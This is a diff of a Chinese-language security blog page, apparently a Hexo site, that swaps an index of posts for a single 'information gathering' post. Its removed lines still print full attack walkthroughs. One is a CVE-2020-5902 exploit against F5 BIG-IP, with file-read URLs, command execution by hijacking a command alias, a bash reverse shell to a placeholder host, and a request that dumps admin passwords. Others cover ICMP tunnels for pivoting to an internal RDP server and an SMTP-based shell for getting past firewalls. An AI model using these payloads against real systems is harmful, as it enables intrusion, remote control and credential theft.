@@ -5,13 +5,17 @@
   
 
   
-  <title>Jinny</title>
+  <title>信息收集 | Jinny</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Jinny">
-<meta property="og:url" content="http://www.jinny.vip/index.html">
+  <meta name="description" content="本机信息收集用户信息123查看本地用户：net user查看本地管理员组（通常包含域用户）：net localgroup administrators查看指定用户详细信息：net user xxx  查看补丁列表12systeminfowmic qfe get Caption,Description,HotFixID,InstalledOn  查看当前用户、权限12whoamiwhoami &amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="信息收集">
+<meta property="og:url" content="http://www.jinny.vip/2020/06/29/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
 <meta property="og:site_name" content="Jinny">
+<meta property="og:description" content="本机信息收集用户信息123查看本地用户：net user查看本地管理员组（通常包含域用户）：net localgroup administrators查看指定用户详细信息：net user xxx  查看补丁列表12systeminfowmic qfe get Caption,Description,HotFixID,InstalledOn  查看当前用户、权限12whoamiwhoami &amp;#x">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-06-29T07:59:25.000Z">
+<meta property="article:modified_time" content="2020-08-03T02:16:46.081Z">
 <meta property="article:author" content="Jinny">
 <meta name="twitter:card" content="summary">
   
@@ -62,127 +66,7 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-cve-2020-5902" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/06/cve-2020-5902/" class="article-date">
-  <time datetime="2020-07-06T03:59:25.000Z" itemprop="datePublished">2020-07-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/06/cve-2020-5902/">cve-2020-5902</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>文件读取</p>
-<p><a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</a><br><a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts</a><br><a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license</a><br><a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</a></p>
-<img src="../img/cve/2020-5902/readfile.png" class="full-image">
-
-
-
-<p>命令执行</p>
-<p>在进行命令执行demo时有较大几率output为空，可多尝试几遍</p>
-<p>利用filesave和tmshCmd可实现RCE</p>
-<p>1.修改alias劫持list命令为bash <a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp</a>? command=create+cli+alias+private+list+command+bash<br>2.写入bash文件 <a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp</a>? fileName=/tmp/1.txt&amp;content=id</p>
-<p>3.执行bash文件</p>
-<p>PS:即使漏洞存在也可能需要多次执行才能成功（4次左右）。<br>同时可用反弹shell(将第二步的Payload换 为/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp? fileName=/tmp/1.txt&amp;content=bash+-i+&gt;%26+/dev/tcp/ip/port+0+&gt;=%26+1)</p>
-<p>4.还原list命令 <a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp</a>? command=delete+cli+alias+private+list</p>
-<p>查看admin的密码：<a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</a><br>查看所有用户的密码：<a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list</a> auth user</p>
-<img src="../img/cve/2020-5902/rce1.png" class="full-image">
-
-<img src="../img/cve/2020-5902/rce2.png" class="full-image">
-
-
-
-<p>文件上传</p>
-<p><a href="https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp" target="_blank" rel="noopener">https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp</a><br>POST：fileName=/tmp/1.txt&amp;content=CVE-2020-5902</p>
-<img src="../img/cve/2020-5902/uploadfile-1.png" class="full-image">
-
-<img src="../img/cve/2020-5902/uploadfile-2.png" class="full-image">
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.jinny.vip/2020/07/06/cve-2020-5902/" data-id="ckddvuosl00006hnbhklm3ia4" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-icmp隐藏隧道" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/06/29/icmp%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/" class="article-date">
-  <time datetime="2020-06-29T07:59:25.000Z" itemprop="datePublished">2020-06-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/29/icmp%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/">icmp隐藏隧道</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>icmpsh</p>
-<p>安装依赖：apt-get install python-impacket<br>关闭本地icmp应答：sysctl -w net.ipv4.icmp_echo_ignore_all=1<br>被控端：icmpsh.exe -t 控制端ip<br>控制端：python icmpsh_m.py 控制端ip 被控端ip</p>
-<img src="../img/icmp/icmpsh.png" class="full-image">
-
-<p>icmptunnel</p>
-<p>控制端：<br>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all<br>./icmptunnel -s<br>/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0<br>ssh <a href="mailto:root@10.0.0.2">root@10.0.0.2</a>            ——最后一步</p>
-<img src="../img/icmp/icmptunnel-server.png" class="full-image">
-
-<p>被控端：<br>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all<br>./icmptunnel 控制端ip<br>/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0</p>
-<img src="../img/icmp/icmptunnel-client.png" class="full-image">
-
-<p>pingtunnel</p>
-<p>#安装libpcap的依赖环境<br>yum -y install byacc<br>yum -y install flex bison</p>
-<p>#安装libpcap依赖库<br>wget <a href="http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz" target="_blank" rel="noopener">http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</a><br>tar -xzvf libpcap-1.9.0.tar.gz<br>cd libpcap-1.9.0<br>./configure<br>make &amp;&amp; make install</p>
-<p>参数说明：<br>-p  跳板的公网IP<br>-lp 指定本机的监听端口<br>-da 目标服务器的内网IP<br>-dp 指定目标服务器的端口<br>-x  为隧道写一个隧道密码，防止隧道滥用</p>
-<p>场景：一个内网中，有一台Web服务器，一台数据库服务器，Web服务器可以ping通过数据库服务器，但是不能直接访问数据库服务器，已知数据库服务器此时有开启3389端口。<br>攻击者的IP地址：192.168.204.43(win10)<br>攻击者的VPS地址：192.168.206.69(kali)<br>web服务器的IP地址：192.168.206.69（外网）<br>数据库服务器的IP地址：192.168.206.67（内网）(win server 2003)</p>
-<p>在攻击者的vps（192.168.206.69）中执行如下命令<br>ptunnel -p 192.168.206.69 -lp 1080 -da 192.168.206.67 -dp 3389 -x cookie</p>
-<p>在Web服务器中执行命令<br>ptunnel -x cookie</p>
-<img src="../img/icmp/pingtunnel.png" class="full-image">
-
-<p>在攻击者的机器上访问自己的vps的1080端口，即使用远程桌面连接：192.168.206.69:1080<br>虽然连接的是192.168.206.69，但是我们通过使用web服务器作为跳板，将vps的1080端口与数据库服务器的3389端口连接在一起了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.jinny.vip/2020/06/29/icmp%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/" data-id="ckddvuost00026hnbdf1236zn" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-信息收集" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-信息收集" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/06/29/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-date">
   <time datetime="2020-06-29T07:59:25.000Z" itemprop="datePublished">2020-06-29</time>
@@ -195,8 +79,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/29/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
+    <h1 class="article-title" itemprop="name">
+      信息收集
     </h1>
   
 
@@ -304,48 +188,28 @@
     </footer>
   </div>
   
-</article>
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-smtp-shell" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/06/02/smtp-shell/" class="article-date">
-  <time datetime="2020-06-02T08:12:43.000Z" itemprop="datePublished">2020-06-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+    <a href="/2020/06/29/icmp%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
         
+          icmp隐藏隧道
+        
+      </div>
+    </a>
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/02/smtp-shell/">smtp-shell</a>
-    </h1>
   
+    <a href="/2020/06/02/smtp-shell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">smtp-shell</div>
+    </a>
+  
+</nav>
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>在实战中可能会遇到能进行命令执行但就是弹不回shell，这时可能是被防火墙检测到了异常流量并进行了拦截，可以试一试smtp或者其他协议进行shell交互<br>这次做的smtp-shell的原理就是被控端把执行的命令发送至目标邮件服务器上，被控端在目标邮件服务器上读取命令在本地执行后再发送至目标服务器，通过smtp-shell有概率绕过边界防火墙的检测，有些边界防火墙不会拦截smtp协议的数据。<br><img src="../img/smtp_shell.png" class="full-image"><br>项目地址:<a href="https://github.com/jinnywc/smtp_shell" target="_blank" rel="noopener">https://github.com/jinnywc/smtp_shell</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.jinny.vip/2020/06/02/smtp-shell/" data-id="ckddvuosx00046hnbhx5yavrl" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
   
 </article>
-
-
-  
-
 
 </section>
         
